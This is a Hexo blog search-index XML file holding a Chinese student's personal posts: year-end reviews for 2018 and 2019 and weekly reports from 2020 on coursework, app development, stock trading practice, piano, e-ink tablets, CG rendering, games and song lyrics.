<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2018年度总结</title>
    <url>/posts/17c7c3bb/</url>
    <content><![CDATA[<p>18年的尾巴，19年的头。 <a id="more"></a> 大学第一个学期结束了，今年也结束了。因为有了其他更加优先的事情,我进入大学以后就没有怎么写过博客。现在放假了，倒是有了些时间来写文章。好久没有写文章，感觉写作都有些生疏了。</p>
<p>大学的感受可以参照这一篇<a href="https://blog.inevitable.tech/2018/10/04/uWelcome/">文章</a>第一个学期我有太多地方做的不足了。从和人打交道，参加社交活动，社团活动，到和教授的互动都是我的不足之处。减少与人的互动，也决定了信息接收的少。并且和人打交道也是很锻炼说话和情商的。下学期，我要提高与教授的互动。多去office hour看看，毕竟一个好的研究生可能就指望着他们呢。</p>
<p>今年最喜欢的游戏倒是很明显，没有什么犹豫-想要传达给你的爱恋。具体的剧情可以看这一篇<a href="https://blog.inevitable.tech/2018/07/07/koikake/">博客</a>除去这个游戏的故事和人设，作者新岛夕想表达的东西也很有意思。两个互相爱慕，但是却又不对彼此诚实的人最后会走到哪里。他们交流起来遮遮掩掩，但是互相又没有完全理解对方的能力。他们有时甚至会因为想要保护自己，而做出一些错误的决定或者得出错误的认知。如何做到坦诚的面对他人和面对自己，这或许是我得到的一点启发。最喜欢的音乐也是这个游戏的原声碟。音乐给我带来了悠扬，安静，亮晶晶的感觉。每首角色歌都有着那个角色的特点。OST-&gt;<a href="https://music.163.com/#/album?id=34609577">传送门</a></p>
<p>今年我第一次参加Hackthon。具体感受的话可以看<a href="https://blog.inevitable.tech/2018/07/28/hackshanghai/">这里</a>。我也是有所收获，认识了一些新朋友。但对于现在逐渐养生的我，hakcthon可能就没有这么合适了。我的确想快速实现一个idea，我的确想结识一些新的伙伴。但是熬夜么。。我其实更想睡觉。这一次，我又报名了大学的hackthon。如果能进的话，我倒是也没有想好要不要去。</p>
<p>今年年底读的书倒是不多，如果只算有实际用处的书的话，可能只有一本《重来》和现在正在看的一本-关于linux内核的书。战争史读起来真的不是那么有意思，而且我的pdf版本还没有图片。实体书又太大，不高兴带着。年底黑五打折的时候，我在NoStarchPress 上买了三本书，一本还在EA阶段，一本超级厚，一本厚度适中。都算是比较实用，我比较感兴趣的书。估计看完了这些书，我会有不少进步吧。《重来》倒是一本不错的书，虽然它讲述的是创业公司的点滴，但它也有助于读者成为一个像独角兽公司一样的人。有行动力，决策果断，弹性，灵活，有创意，有热情。里面每一篇都配有一幅插图，很形象的阐述着这一篇的主题。它是一篇文集，但是它与《黑客与画家》不同，它更注重与实际层面。当然了，不管它再怎么实际，读这种行动指南的时候，难免还会觉得有些宽泛。毕竟情况是多变的，原则到底在哪里，就要靠自己领悟了。</p>
<p>今年年底我也是做了一个app，具体的想法可以点<a href="https://blog.inevitable.tech/2019/01/02/MessageEncrypt/">这</a>。安卓开发也是挺神奇的，疯狂的调用各种令我一脸懵逼的api。最有意思的还是设计Icon，我自己手画了一个Icon。感觉我的Icon在手机APP一堆妖艳的Icon里显得格外清新脱俗。以后估计我的Icon设计风格就是这个样子的了。以一个动物为主，不同的设计就是画出不同动作，不同装扮的这只动物。</p>
<p>经历了这样一次开发，我感觉比较适合的速度可能是一个学期写一个小的项目。暑假空闲些，可以一个月到一个半月写一个小项目。我看了看To Do List，上面有不少我喜欢的idea在等着我去实现。估计再过两个学期，我基础线代也学得差不多了。是一个我觉得比较适合上手深度学习项目的时候了。但我倒是没有什么比较好的idea。如果没有项目可写，我就准备写两篇渗透报告练练手。总之，不断进步，不要停下。</p>
<p>和女朋友相处也是有不少的挑战，毕竟和女朋友在一起一点都不像和自己的舍友在一起一样。中间会发生争吵，拒绝会变得困难等等等等。具体的想法可以看<a href="https://blog.inevitable.tech/2018/07/28/hackshanghai/">这儿</a>。</p>
]]></content>
      <categories>
        <category>生活随想</category>
      </categories>
      <tags>
        <tag>生活随想</tag>
        <tag>年终小结</tag>
      </tags>
  </entry>
  <entry>
    <title>2019年终小结</title>
    <url>/posts/cd5b0535/</url>
    <content><![CDATA[<p>一眨眼2019也过去了。来看看2019年我做了什么，2020年又要做什么。 <a id="more"></a></p>
<h2 id="x00-重温去年的总结">0x00 重温去年的总结</h2>
<p>18年总结中提到我博客更新的速度不是特别快，2019写的也不是特别多。一个月一篇的样子。有的时候是有些想写的东西，但是稿子改着改着一个月就过去了。</p>
<p>和人打交道似乎也没有什么进步。似乎没有认识什么新的朋友，也没有经常去跟教授聊天。18年制定的第一个指标已经落空了。</p>
<p><a href="https://www.inevitable.tech/posts/f2f7dc5d/">想要传达给你的爱恋</a>这款游戏直到现在我还记得。它的OST我也时不时的拿出来听一听。可以说是回味无穷了。</p>
<p><a href="https://www.inevitable.tech/posts/4054467b/">渗透报告</a>尝试写了一次，并没有按照规范写，只是记录下了学到的一些东西。比如有用的经验，一些漏洞之类的。写出来的东西更像是手册，而不是报告。一步一步地记录下我所用的工具和使用的命令不是一件容易得事情。毕竟很命令都是从网络上抄下来的，很难在渗透结束后回忆出来。</p>
<h2 id="x01-今年的主要工作重心">0x01 今年的主要工作重心</h2>
<p>现在我也算是大二的学生了。2019年在很多“正经”的方面都没有突破，唯一有飞跃的地方只是恋爱。我在女朋友身上投入了太多的关注。</p>
<p>2019年的进步除了恋爱方面，便是恋爱的附属品——生活质量有所提升。主要体现在知道什么叫精致生活了。如何让一切变得赏心悦目，如何布置一个家，并且逐渐开始享受和愿意尝试各式各样的美食。</p>
<h2 id="x02-都做了哪些具体的事情">0x02 都做了哪些具体的事情</h2>
<ol type="1">
<li>2019年一共上了四个学季的课。上课类别如下图所示：
<center>
&lt;img class="lazyload"" data- src="/static/images/2019course.webp" height="80%" width="80%"&gt;
</center></li>
</ol>
<p>在学习了一年的数学后，我逐渐接触到了数学证明。不像以前初中简单的代数或是几何证明，现在的证明更加严谨。现在要求语句通顺，前后句连接紧密，尽量不缺少任何一个细节。阅读一个证明就是跟着作者的思路一起思考。从已知条件一步步的来到需要证明的结果前。我最讨厌的证明便是跳步骤的证明或是突然使用了从未定义过的变量。这样的证明读起来感受不到连贯。我在读的时候总需要从上文去找线索，来填补作者跳跃的语句。</p>
<p>以前的数学课是学概念，做计算题。现在的数学课不但学概念，还学定理。课后作业便是扣着概念，把定理千方百计的架在已知条件和需要证明的东西之间。有时思路在脑子里走一遍只是几分钟的事情，但是真正不缺少任何细节的落实到笔头上，往往需要二十分钟左右。短短的4，5道题可以写上整整一个下午。</p>
<ol start="2" type="1">
<li>2019年是Flutter发展很快的一年。Flutter有着一套代码，全平台运行的野心。在2019年，ios端和android端的适配逐渐趋向完善。PC端和Web也逐渐走出alpha测试，但是并不完善，不能用于生产。</li>
</ol>
<p>我上手Flutter写了一个每日打分的app。花了半个月体验了从设计到代码实现的全过程。最后掉在了Firebase package无法适配ios的坑里，爬都爬不出来。</p>
<p>UI设计用的是Adobe XD。Mac果然还是设计师的最爱,不少好用的设计软件都是Mac独占。Adobe XD和Axure算是win上比较好用的原型工具。但是Axure不免费，而且UI太丑了。最后我选择Adobe XD。Adobe XD在原型设计上还说的过去，也有不少插件。但是UX部分和动画部分就不怎么行了，只有最基本的功能，甚至在动画部分连时间轴都没有。</p>
<ol start="3" type="1">
<li>2019也很开心的和朋友写了一个<a href="https://www.inevitable.tech/posts/85fb390f/">微信小程序</a>。感受了一把微信小程序生态的不成熟。</li>
</ol>
<p>我使用Taro小程序框架以类似React Native的语法开发了一个发布行程的简单小程序。我同样是做了设计和大部分代码。</p>
<ol start="4" type="1">
<li><p>写了第一个前端Theme，<a href="https://github.com/glazec/hexo-cheatsheets">Hexo Cheatsheets Theme</a>，虽然我基本没写几行css。因为设计借鉴了别人的Cheatsheets，CSS也是直接从原网站借鉴的。我所做的只是用JS写了一堆胶水，为元素添加了一堆的class和id，加了点div和代码高亮的引用。</p></li>
<li><p>为Blog做了一些简单的优化。</p></li>
</ol>
<p>为其添加了通告栏样式。这算是hexo cheatsheets theme的一个后续。</p>
<p>将大部分图片资源变成了webpg，对css和js进行了压缩。将整个网站的加载速度维持在3秒左右。</p>
<h2 id="x03-问题和遗憾的部分">0x03 问题和遗憾的部分</h2>
<ol type="1">
<li><p>我所写的项目没有一个是开发成功，投入运营的。这就导致我缺少了维护，更新的经历。在2019年，我几乎没有写过一个test，没有为优化性能花过一点心思，也没有写过任何的动画。因为所有项目都没有活到那个时候。这或许是因为这些项目先天不足。没有认真思考过它们的前景就开始动手。在开发的过程中，又不断出现新的问题，导致这些项目就坑在了那里。</p></li>
<li><p>我还是不习惯Flutter Bloc的状态管理方式。不管考虑了多少遍，始终觉得解耦给整个程序带来了更高的复杂度。Bloc所带来的好处可能得在长期才有体现。将UI和逻辑解耦，只有在后期进行维护的时候才能感受到便利。然而我的项目没有一个是需要维护的。</p></li>
<li><p>2019年吸纳的新知识比较少。我知识面的深度和广度都没有什么变化。或许是因为心态比较浮躁，不能够耐心地忍耐着枯燥去挖掘深度，也不能忍受毫无意义的广度拓展。说广度的拓展毫无意义是因为学到的东西可能跟我在做的事情没有多大的联系。2019年我不管做什么，都会问问自己这个做了有用吗？这也导致广度的拓展迟滞了下来。</p></li>
<li><p>手机浏览器的书签越来越多。大多数都是可能在未来某个时候有用的网页，或者是一些硬核的文章。虽然我知道这些都可以在有需要的时候从搜索引擎上获得，但是抛弃这些似乎有点用的信息有些不忍。目前我也没找到什么合适的管理我所有信息/资源的方式。</p></li>
</ol>
<h2 id="x04-自我评定">0x04 自我评定</h2>
<p>总的来说2019年学术按部就班；在作品上花了一定的时间，但是没有任何成效；生活上倒是过的还算舒适，一个人在外面也没有变得乱七八糟。</p>
<h2 id="x05-明年的计划">0x05 明年的计划</h2>
<p>2020年希望能写一个值得长期维护的东西出来。目前有三个想法，一个是资源管理器，一个是用户分享灵感，寻找合伙人并分享项目进展的平台，以及一个记录在每个领域所花费时间的app。</p>
<p>希望能为开源项目做一些贡献。希望我能尝试code review。</p>
<p>希望明年的知识面能在广度和深度上有所提升。</p>
<p>希望明年能找到一个合理的管理所有资源的方式。绝对不是windows的资源管理器。毕竟它只能管理本地的内容，对于在线的内容束手无策，比如书签。</p>
<h2 id="x05-明年的书单">0x05 明年的书单</h2>
<ul>
<li>舆论</li>
<li>什么是数学</li>
<li>故事：剧情</li>
<li>clean code</li>
<li>The Pragmatic Programmer: From Journeyman to Master</li>
<li>Programming Pearls</li>
<li>Introduction to Algorithms</li>
<li>Code: The Hidden Language of Computer Hardware and Software</li>
<li>Working Effectively with Legacy Code</li>
<li>What If?: Serious Scientific Answers to Absurd Hypothetical Questions</li>
<li>The 1-page marketing plan</li>
<li>Crossing the Chasm</li>
<li>原则 principle</li>
<li>POC||GTFO</li>
<li>A Mathematical Theory of Communication</li>
<li>Google search&amp;eigen value</li>
<li>液體: 流經生命的美酒、海浪、煤油、眼淚、液晶……: Liquid (Traditional Chinese...</li>
<li>Stuff Matters （简体中文译名：迷人的材料）</li>
<li><a href="https://draveness.me/golang/">Go 语言设计与实现</a></li>
</ul>
]]></content>
      <categories>
        <category>生活随想</category>
      </categories>
      <tags>
        <tag>生活随想</tag>
        <tag>年终小结</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 年第 31 周</title>
    <url>/posts/ae1215a8/</url>
    <content><![CDATA[<p>这周数学作业计算量真大。</p>
<a id="more"></a>
<h1 id="weekly-report-2020-年第-31-周-08-03-到-08-09">Weekly Report 2020 年第 31 周 （08-03 到 08-09）</h1>
<h2 id="这周做了什么">这周做了什么</h2>
<h3 id="投资">投资</h3>
<p>上周的目标本来是学习期权的。但是我的账户目前买不起很多期权，等我账户里钱多一些再去看期权好了。</p>
<p>这周没有看期权，改为技术分析（Technical Analysis）。学习了一些常见的 K 线图形状。市场上的各种变化都会反应到 k 线图上，因此从 k 线图的形状我们也可以解读出一二，并对市场进行推测。除了 k 线图的形状，我还看了一些指标和一些规则或者说是原则。</p>
<p>下周尝试用 TradingView 的 Screener 去选择一些股票，去做一周或者几天的短线。目前感觉做短线有点像从股票的 k 线图中去找一些熟悉的形状。当找到两种或者多种迹象表明这个股票明天会涨，那么我们就可以进一步考虑止损设置和止盈设置。如果盈亏比例合理，就可以考虑做一波短期了。</p>
<h3 id="琴">琴</h3>
<p>弹琴可真难。左右手的配合，手的移动。我现在像一个都是洞的木桶，哪儿都漏水。谱读的慢，辨别音符都得画上点时间，手的移动很生涩，能按对音都已经不容易了。等按对音了，就可以进一步练习节奏和音乐性。钢琴真的时看起来容易，但是练起来很难。</p>
<h3 id="google-drive-搜索">Google Drive 搜索</h3>
<p>与上周相比并没有多大的变化。主要时发现如果要把它做成要给公开的插件需要完成 Google API 的认证，着看着还挺麻烦的。把这个插件放下的一周里，我自己都没用过几次。先把它放在这，等哪天真的用起来了在考虑进一步完善好了。</p>
<h3 id="e-ink">E-ink</h3>
<p>重新刷入系统后，我成功将 Remarkable 升级了。原本我是打算买新的写字用的板子，但是系统升级成功的给 Remarkable 续上了。我的 Remarkable 终于收到这三年以来的所有更新。这包含新的功能，续航的提升，性能优化，UI 重做。这些更新让 Remarkable 焕然一新。</p>
<p>不足：现在还不支持增加书签，大纲；升级以后中文书籍都出现了缺少字体的情况；不支持手指动作进行缩放；关闭笔记本的按钮放在了右上角，很容易误触。 优点：工具栏被重做，原本占据顶栏和侧栏的两个工具栏被合并为侧栏，给内容显示更多的空间。但是由于合并，基本上所有功能有了二级菜单。点点点的次数有所增加。</p>
<p>与 Remarkable 形成反差的的是 Sony DPT-RP1。在买了 Remarkable 半年后，我买了它。最近也是我第一次给它升级。和 Remarkable 相比，RP1 的升级就没有很大的变化。都是一些不怎么重要的功能。最引人瞩目的是它大大降低了手写笔的延迟。升级前和升级后的延迟区别是可以感知的。</p>
<h2 id="这周评价">这周评价</h2>
<p>上周的目标似乎都七七八八做完了。仔细回忆起来，上周并不能称得上时充实的一周。下周可以适当的多做一些事情。</p>
<ul class="task-list">
<li><input type="checkbox" disabled="" checked="" />
完善 Google Drive 搜索的 Demo。探索全部使用 Node.js 进行实践，考虑加入 Coda 文档搜索。</li>
<li><input type="checkbox" disabled="" checked="" />
每天半个小时到一个小时的钢琴练习。</li>
<li><input type="checkbox" disabled="" checked="" />
提升 GRE 模考十分。</li>
<li><input type="checkbox" disabled="" checked="" />
学习期技术分析。</li>
</ul>
<p>完成度 100%</p>
<h2 id="下周做什么">下周做什么</h2>
<ul>
<li>提升 GRE 分数到 325。</li>
<li>每天半个小时到一个小时的钢琴练习。</li>
<li>学习完基本乐理。</li>
<li>做短期交易。</li>
</ul>
]]></content>
      <categories>
        <category>周报</category>
      </categories>
      <tags>
        <tag>Remarkable</tag>
        <tag>DPT-RP1</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 年第 30 周</title>
    <url>/posts/93723c18/</url>
    <content><![CDATA[<p>这周的事情为什么没有做完？因为有期末考试！这借口听着怎么样？</p>
<a id="more"></a>
<h1 id="weekly-report-2020-年第-30-周-7-27-到-08-02">Weekly Report 2020 年第 30 周 （7-27 到 08-02）</h1>
<h2 id="这周做了什么">这周做了什么</h2>
<h3 id="投资">投资</h3>
<h4 id="coda-文档完善">Coda 文档完善</h4>
<p>在上周，文档已经用 Coda 写的差不多了。我可以在文档上记录交易记录，追踪投资组合的价格，提供一些交易所 App 上没有的图表，比如投资组合日波动，即（投资组合今天的价值-投资组合昨天的价值）/投资组合昨天的价值。这份文档也会自动根据市场价格提醒我 Rebalance。</p>
<p>刷新市场价格的时候我遇到一些问题。在 Coda 自动化面板中有刷新这个功能，但是我实际使用发现股票价格并没有刷新。所以我将刷新功能改成每天定时把旧的价格更改为新的价格（modify row）。这本应该是一个 For Loop，然后修改每一行中的价格列。然而我惊喜的发现 Coda 没有 For Loop，只有 map。在使用 map 的时候我遇到一些跟 row，column，table 有关的问题。鉴于我的组合里只有几只股票，我就直接把 for loop 拆成一个个的定时操作。</p>
<p>这份 coda 文档未来还有提升的空间，目前它只能记录股票的价格。如果未来我开始用期权，那么应该有着不同于股票的记录方法。</p>
<h4 id="交易">交易</h4>
<p>这周黄金价格突破了 2012 年左右的高点。为了 rebalance。我卖出了一些 IAU。</p>
<p>随着黄金价格不断的攀升，突破过去的最高点，我也开始担心它可能到来的下跌。如果不是为了保证投资组合的比例与我预先设计的一样，我会在这个点抛售手中的黄金。但是为了保证我的组合比例，我不得不捏着它，即使它变得越来越有风险。我可能会考虑买入一些期权来减少可能的损失。这也是我目前学期权的一大目的。</p>
<h3 id="琴">琴</h3>
<p>现在用 Yousician 学习弹琴。Yousician 在难度曲线上感觉做的还是挺不错的，循序渐进。基本上 Yousician 上的所有曲子都是有其他乐器的伴奏。和卡拉 ok 一样，Yousician 有一个竖线在琴谱上移动，来表示现在乐曲进行到哪了。相比单纯使用节拍器，这种模式对用户节奏感的要求低了很多。</p>
<p>用 Yousician 练习曲子就跟打音游一样。连续弹对正确的音可以有连击分数。如果一个音的节奏弹对了，就会有分数加成。如果快慢一拍以上，这个音就算没有弹到。Yousician 只会判断你的音什么时候开始，但是不会判断你的音什么时候结束。比如你把一个全音符弹成十六分音符，Yousician 并不会有任何的反应。</p>
<p>理论方面的题目感觉会偏难一些。比如给你十几个 C 大调的声音，给定关系，例如第一个音要低于第二个音，第二个音要等于第三个音，让你为他们按照给定给定的关系排列顺序。最难的地方在于你并不知道第一个音是什么。你可能排列完大部分音后发现你第一个音开始的太高了，导致后面的低音没有候选项。</p>
<p>将琴连接掉电脑上当作 MIDI 键盘的时候，我感觉延时很大。总感觉自己弹的又抢拍的嫌疑。或许是因为声卡的原因，买一个外置声卡可以解决这个问题。</p>
<h3 id="google-drive-搜索">Google Drive 搜索</h3>
<p>我开始尝试将 Google Drive 搜索整合到启动器里。本来考虑集成到 Wox 中，但在开发 Wox 插件初期，我并不能成功加载开发中的插件。</p>
<p>第二个考虑的 <a href="https://u.tools/">Utools</a>。这是一个最近出现的全平台启动器，而且支持图片内容的处理。总的来说就是好看，功能也很强大。它的插件开发需要使用 Js，会更加复杂一些。而且开发者不单单要处理数据，而且还要处理 UI。官方提供了两个很基础的 UI 模板。为了减少工作量，我决定采用模板。开发过程中我发现这东西不支持热重载，Debug 过程变得很繁琐。</p>
<p>我本来的思路是使用 Google Drive 的 Js API 来进行搜索和获取文件信息。然而最有难度的是授权步骤。授权步骤涉及到授权文件的存放和读取，用户需要点击 URL 进行授权。官方给的样例代码里充满了各种回调。我本以为<code>Await</code> 已经把回调地狱消灭的干干净净，没想到在这又遇到了。</p>
<p>为了以最快的时间写出 Prototype，我决定采用 Node 调用 Python，把数据处理的部分交给 Python。再见，回调。虽然这样并不能解决授权文件的存放和读取，授权步骤，先有个 demo 试用一下，确认一下方向。</p>
<p>随着开发的深入，模板 UI 开始显得不够用了。Google Drive 常用的搜索分为文件类型，文件名字，以及全文搜索。如果采用列表式模板 UI，为了提供尽可能灵活的搜索，用户需要输入具体搜索命令，例如 <code>name contains 'hello'</code>。这很繁琐，尤其是经常遗忘的引号。<a href="https://u.tools/">Utools</a> 官方的 Everything 插件 UI 不错。它把常见的搜索模式以 Tab 的形式垂直排放在左侧，但这并不是模板 UI。Google Drive 官方的搜索似乎也不错。在开始搜索的时候，它会显示搜索选项，比如按照文件类型搜索等。如果用户没有进行选择，那么就会进行默认搜索。或许我可以参考这个想法。对用户选择搜索结果的行动进行分类，并且继续使用模板UI。如果是 Enter 阶段，那么用户会看见搜索类型，用户可以选择对应的搜索类型。如果是 Search 阶段，用户选择对应的搜索结果会在浏览器中打开。</p>
<h2 id="这周评价">这周评价</h2>
<p>这周并没有完成上周的目标。实际开始完成计划的时候已经是周六周日。如果从周一就开始做这些事情，相信是可以做完的。</p>
<ul>
<li><input type="checkbox" disabled="" checked="" />
看看能不能把我所有的文档入口集成到启动器当中，即在启动中可以搜索云端文件。</li>
<li><input type="checkbox" disabled="" checked="" />
想买个电钢琴</li>
<li>[] 优化文件管理</li>
<li><input type="checkbox" disabled="" />
探索个人通知的实践</li>
</ul>
<p>完成度 50%</p>
<h2 id="下周做什么">下周做什么</h2>
<ul>
<li>完善 Google Drive 搜索的 Demo。探索全部使用 Node.js 进行实践，考虑加入 Coda 文档搜索。</li>
<li>每天半个小时到一个小时的钢琴练习。</li>
<li>提升 GRE 模考十分。</li>
<li>学习期权的基本概念以及基本策略。</li>
</ul>
]]></content>
      <categories>
        <category>周报</category>
      </categories>
      <tags>
        <tag>投资</tag>
        <tag>Coda</tag>
        <tag>Yousician</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 年第 32 周</title>
    <url>/posts/e9b26f78/</url>
    <content><![CDATA[<p>Differential Geometry 逐渐变难，下周得多花点时间在上面。</p>
<a id="more"></a>
<h1 id="weekly-report-2020-年第-32-周-08-10-到-08-16">Weekly Report 2020 年第 32 周 （08-10 到 08-16）</h1>
<h2 id="这周做了什么">这周做了什么</h2>
<h3 id="投资">投资</h3>
<p>短期尝试做了几单。全部以止损告终。由于短期的仓位都不是特别大，止损点也比较保守，亏损并没有太大。逐渐理解了“Buy Strength，Sell Weakness”的含义。这句话想要强调的是趋势的重要性。例如股票在持续上涨，我们在没有明确强力依据的情况下不应该认为它的趋势会变化。因此我们的选择是买入，而不是卖出。毕竟转折点只有那一个，没有那么容易抓住。</p>
<h3 id="cg">CG</h3>
<p>尝试了一些流体。带有气泡，浮沫等粒子效果的流体还是很酷炫的。尤其是这些粒子可以有不同的颜色，这让流体更加的多样性。</p>
<p>本来我想做一个字体中充斥着流体的感觉。但我发现字体作为流体的 Domain 不是那么靠谱，可能是因为字体转换为 Mesh 后并不是封闭的，导致流体模拟出现差错。既然字体这个复杂的 Mesh 不行，我就取巧用长方体搭一个字体出来。这的确可行，但是一个个设置流体属性和出水口很繁琐。</p>
<p>流体酷炫就在于它会流动，于是我渲染了 120fps 的 5 秒 1080p 动画，这花了我 4 天时间，效果也不是很理想。光线之类的需要改动，分辨率也有点低，看着糊。看来是时候换一个显卡了。这一个动画等四天实在是有点折磨人。</p>
<h3 id="插画">插画</h3>
<p>有一个奇怪的画画分支叫 3D 辅助绘画，应该是国内特有的分支。我在 Youtube 上没有找到类似视频。这个分支的特色是在 3D 软件中做出插画的大概样子，然后再导出进行微调和上色。这么做的好处是 3D 软件的透视是不可能错的，光影也没有任何问题，如果利用 3D 小人，我们人体的动作等也不会有错。这听着好处多多，把很多画画基本功的要求都降低了。</p>
<p>既然我已经会一些 CG 的东西了，为什么不尝试一下这个分支呢，说不定有 1+1&gt;2 的起效。因此我开始尝试插画。这周看了 <a href="https://www.bilibili.com/video/BV16a4y1t7sN?">这个视频</a>。它教授了如何从画家的角度去观察物体。我们应该避免符号和语言的影响。比如一说到椅子，大家都知道椅子是什么样子，知道转椅的轮子是圆的。但是在实际情境中，由于透视，光线和地面，椅子的轮子就不是圆的。我们需要避免符号和语言的影响，专注于我们所观察到的。</p>
<p>其中她提到一种方法，叫 Negative Space。也就是如果你眼中看到的具有强烈的符号含义，你可以尝试取反，观察那些没有意义的负空间。比如画椅腿，你可以画没有椅子腿地板的轮廓。我们一共要观察这几个东西：轮廓，光影，空间，线与线之间的角度，长度关系。</p>
<h2 id="remarkable">Remarkable</h2>
<p>如果要用软件进行画画，手绘板是必不可少的。现在除了手绘板还有 Ipad 可以选，Ipad 上的 Procreate 真的很厉害。它有着与其他软件不同的设计，它能给用户一个干净的画布，而不是像 PS 有着密密麻麻的侧栏和工具栏。</p>
<p>我惊喜的发现 Remarkable 通过第三方软件可以变成一块手绘板，虽然没有自定义按键什么的，压力感应也仅支持 Linux 系统，但这也算是短期内为我节省了一块板子钱。最近 Remarkable 已经给我带来了不少惊喜了。</p>
<h2 id="这周评价">这周评价</h2>
<p>上周的目标基本都做完了，除了 GRE。基础乐理学习完了，但是我发现这离目标编曲实在是差太多了。我决定继续练琴，积累一些知识。</p>
<p>GRE 的数学已经接近满分了，但是阅读实在是太拉跨了。下周主要提升阅读理解的正确性，然后巩固单词。</p>
<ul class="task-list">
<li><input type="checkbox" disabled="" />
提升 GRE 分数到 325。</li>
<li><input type="checkbox" disabled="" checked="" />
每天半个小时到一个小时的钢琴练习。</li>
<li><input type="checkbox" disabled="" checked="" />
学习完基本乐理。</li>
<li><input type="checkbox" disabled="" checked="" />
做短期交易。</li>
</ul>
<p>完成度 75%</p>
<h2 id="下周做什么">下周做什么</h2>
<ul>
<li>提升阅读题目正确率到 80%。</li>
<li>每天半个小时到一个小时的钢琴练习。</li>
<li>学习完至少 3 个画画课程。</li>
<li>画不同角度的几何体。</li>
<li>尝试云渲染动画。</li>
</ul>
]]></content>
      <categories>
        <category>周报</category>
      </categories>
      <tags>
        <tag>Remarkable</tag>
        <tag>投资</tag>
        <tag>插画</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 年第 35 周</title>
    <url>/posts/5b92b368/</url>
    <content><![CDATA[<p>期末了！</p>
<a id="more"></a>
<h1 id="这周做了什么">这周做了什么</h1>
<h2 id="整理电子书">整理电子书</h2>
<p>这周抽空把电脑里的电子书整理了一下，给他们分分类，搬一个新家。<a href="https://calibre-ebook.com/">Caliber</a> 是一个很不错的电子书管理软件，除了 UI 丑一点。Caliber 在导入电子书时会将源文件拷贝到自己的文件夹里。导入成功后，我们就可以把源文件给删掉了。我主要用 Caliber 来管理书籍的元数据和转换格式。很多书的元数据残缺不全，连标题都没有。看着封面输入标题，作者，标签，出版社，评分挺花时间的。如果是一些热门的书籍，可以只添加 ISBN，接着让 Caliber 帮助你自动添加信息。</p>
<p>对于我来说，元数据缺的多的书大多是那些过时的很烂的书。整理的时候舍不得把他们删掉（其实以后也未必会扫两眼），那就得给他们填充元数据。</p>
<h2 id="群星">群星</h2>
<p>心血来潮，加了一些 mod 开了一局。策略游戏总是需要玩家做很多选择题。这些选择题的目的都是累积更多的资源。多玩两把就会发现局部最优解。再玩下去则可能变成不断重复自己以前做的决策，陷在局部最优解中。在这一段时间里，每一局游戏都不能带来一些新鲜的反馈。如果想要走出这样的重复可以选择一些以前没有玩过的开局。比如以前走种田流，现在选择多打仗进行扩张。这种选择促使我们找到新的局部最优解，毕竟以前的解不可靠了。</p>
<p>群星里面的事件完成后都有语音提示。在事件较多的中后期，语言提示出现的相当频繁。在手游萌化的当下，手游们请着各式各样的优秀 CV 来配音。群星里翻来覆去都是那几个死板的配音，跟手游们背道而驰，严重损害了游戏体验。得益于丰富的 Mod 支持，我发现有玩家特意氪金聘请战舰少女中的 CV 录制了新的语音，制做成了 <a href="https://steamcommunity.com/sharedfiles/filedetails/?id=1970249743">免费的 Mod</a>。</p>
<h2 id="歌曲">歌曲</h2>
<h3 id="shelter">Shelter</h3>
<p><a href="https://www.youtube.com/watch?v=fzQ6gRAEoy0">Shelter</a> 是 Porter Robinson 的一首电音。其实我不怎么听电音，但这首曲子的特点在于它的 MV 由 A1 Picture 制作，讲述了世界末日后少女孤独的在 VR 中生活，直到有一天她想起了自己的童年和父亲。西方电音配上日本动画，这个组合非常有意思。有文化差异的音乐和画面表达着同样的情绪。有了这个 MV，观众们得以更加容易的捕捉到这首歌曲所要传达的情绪。例如开头的画面和音乐共同谱写了喜悦的情绪。</p>
<blockquote>
<p>谢谢谢谢谢谢 porter+ madeon 本来日系 ACG 和欧美 EDM 是极少有交集的两个世界，一个在欧美常常背着负面，边缘化，死宅的名声，一个在主流中渐渐变成流行，被认可，只是中间隔了太多文化的刻板印象………直到今天两个世界总算和在了一起 美好的东西本不该被贴上标签 <span class="citation" data-cites="Lewreko">@Lewreko</span> 网易云</p>
</blockquote>
<h3 id="越单纯越幸福">越单纯越幸福</h3>
<p>王筝的 <a href="https://www.youtube.com/watch?v=3czJfPNmfnA&amp;list=RD3czJfPNmfnA&amp;start_radio=1&amp;ab_channel=Z%C3%A9NetoeCristianoMusicChannel">越单纯越幸福</a> 是杜拉拉升职记的推广曲。这算是很久很久以前，十年前的歌。整首歌也跟标题一样，乐器用的较为简单，很匹配整首歌的情绪。歌词写的很棒。</p>
<p>第一句”你说起那条回家的路“就把听众拉入了回忆之中。我想起小学和初中时每天挤公交车回家。公交车站上都是放学的学生和跟着他们的家长。</p>
<p>”越害怕越孤单谁的付出多一点，越躲藏越相爱越怕输。” 很多时候你让一步我就快乐，我让一步你就快乐。</p>
<p>“越长大越怀念少年时有多勇敢，骑单车摔多痛也笑着哭。” 怎么看都是在说现在的不勇敢。想到江南对路明非勇敢的赞扬。</p>
<p>“心像开满花的树。” 这个比喻也很不错。一般我们把心和花连在一起，比如心花怒放。但这儿又加了树。树总感觉和叶是一伙的，叶又是用来衬托花的。</p>
<h3 id="如烟">如烟</h3>
<p>五月天的 <a href="https://www.youtube.com/watch?v=Qd9YGu3FWgc">如烟</a> 也是 2010 年左右的老歌。这首歌的歌词也是很棒，讲述了一个在床上等待死亡的老人回顾自己的一生。</p>
<blockquote>
<p>〔... 有没有那么一个世界 永远不天黑 星星太阳万物都 听我的指挥。..〕 石头的曲，结合阿信的词，一向都有一种壮阔瑰丽的美感，这首歌阿信挑战自己，歌词从头到尾没有任何一句重复，把人生一瞬间，如烟飘散眼前的不舍回忆与千万感慨，通通都浓缩进这首歌里头。 藉由一个在床上等待死亡的老人心中，反射出人的一生：从出生到第一个吻，从成家立业到儿孙满堂，从挥霍浪费的青春到没说的一句抱歉，那些残存的人世眷恋和遗憾后悔，最后就化成一滴眼泪如烟消散在人世间。.. 官方介绍</p>
</blockquote>
<blockquote>
<p>不知道是不是只有我覺得這首的文學價值非常之高。</p>
